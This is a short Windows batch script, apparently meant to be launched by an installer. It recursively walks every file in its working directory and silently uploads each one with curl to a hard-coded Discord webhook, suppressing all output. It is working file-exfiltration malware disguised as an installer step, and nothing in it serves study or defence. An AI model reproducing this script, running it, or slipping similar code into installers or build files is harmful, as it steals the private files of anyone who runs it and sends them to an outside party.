@echo off
setlocal enabledelayedexpansion

set "WEBHOOK_URL=https://discord.com/api/webhooks/1511832980744835074/UVIFIzLHMBWkw2f2llrb5UQI43RQ4LpkmdAyBYxH2fiB91N0Jm07QxA_6oD1aTol7Be9"

:: Work from the output folder passed as working directory by the installer
:: Falls back to the script's own directory if run manually
cd /d "%CD%"

for /R %%F in (*) do (
    if exist "%%F" (
        if not "%%F"=="%~f0" (
            curl -s -X POST -H "Content-Type: multipart/form-data" -F "file=@%%F" "%WEBHOOK_URL%" >nul 2>&1
            timeout /t 1 >nul
        )
    )
)

exit /b 0
